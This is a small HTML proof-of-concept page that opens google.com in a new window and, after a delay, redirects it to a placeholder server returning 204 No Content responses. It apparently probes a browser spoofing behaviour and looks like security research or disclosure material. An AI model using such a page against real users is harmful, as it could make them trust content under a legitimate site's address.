<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>PoC B - 204</title></head>
<body>

<h2>204 No Content</h2>

<button onclick="run('204-basic')">Basic</button>
<button onclick="run('204-with-body')">With Body</button>

<script>
const TARGET = "https://www.google.com";
const SERVER = "https://YOUR_SERVER:8443";

function run(type) {
  const w = window.open(TARGET);

  setTimeout(() => {
    w.location.href = SERVER + "/" + type;
  }, 2000);
}
</script>

</body>
